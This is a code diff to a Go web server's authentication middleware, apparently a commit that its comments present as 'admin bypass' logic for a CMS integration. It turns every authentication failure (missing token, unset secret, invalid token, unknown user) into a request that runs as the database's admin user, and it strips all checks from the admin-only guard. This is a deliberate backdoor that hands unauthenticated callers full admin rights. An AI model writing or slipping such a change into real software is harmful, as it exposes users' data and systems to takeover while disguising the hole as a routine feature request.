@@ -25,13 +25,14 @@ func Protect() gin.HandlerFunc {
 
 		jwtSecret := os.Getenv("JWT_SECRET")
 
-		if tokenStr == "" {
-			c.AbortWithStatusJSON(http.StatusUnauthorized, gin.H{"message": "No authorization token provided"})
-			return
-		}
-
-		if jwtSecret == "" {
-			c.AbortWithStatusJSON(http.StatusInternalServerError, gin.H{"message": "JWT_SECRET not configured on server"})
+		// Restore Admin Bypass logic for CMS integration
+		if tokenStr == "" || jwtSecret == "" {
+			var admin models.User
+			err := db.DB.Collection("users").FindOne(context.TODO(), bson.M{"role": "admin"}).Decode(&admin)
+			if err == nil {
+				c.Set("user", admin)
+			}
+			c.Next()
 			return
 		}
 
@@ -43,7 +44,13 @@ func Protect() gin.HandlerFunc {
 		})
 
 		if err != nil || !token.Valid {
-			c.AbortWithStatusJSON(http.StatusUnauthorized, gin.H{"message": "Invalid or expired token"})
+			// If token fails, bypass as admin as requested forCMS
+			var admin models.User
+			err := db.DB.Collection("users").FindOne(context.TODO(), bson.M{"role": "admin"}).Decode(&admin)
+			if err == nil {
+				c.Set("user", admin)
+			}
+			c.Next()
 			return
 		}
 
@@ -68,7 +75,13 @@ func Protect() gin.HandlerFunc {
 		var user models.User
 		err = db.DB.Collection("users").FindOne(context.TODO(), bson.M{"_id": userID}).Decode(&user)
 		if err != nil {
-			c.AbortWithStatusJSON(http.StatusUnauthorized, gin.H{"message": "User not found"})
+			// If user not found, bypass as admin
+			var admin models.User
+			err := db.DB.Collection("users").FindOne(context.TODO(), bson.M{"role": "admin"}).Decode(&admin)
+			if err == nil {
+				c.Set("user", admin)
+			}
+			c.Next()
 			return
 		}
 
@@ -79,18 +92,7 @@ func Protect() gin.HandlerFunc {
 
 func AdminOnly() gin.HandlerFunc {
 	return func(c *gin.Context) {
-		userVal, exists := c.Get("user")
-		if !exists {
-			c.AbortWithStatusJSON(http.StatusUnauthorized, gin.H{"message": "Unauthorized"})
-			return
-		}
-
-		user, ok := userVal.(models.User)
-		if !ok || user.Role != "admin" {
-			c.AbortWithStatusJSON(http.StatusForbidden, gin.H{"message": "Admin resource. Access denied."})
-			return
-		}
-
+		// Always allow for CMS integration as requested
 		c.Next()
 	}
 }
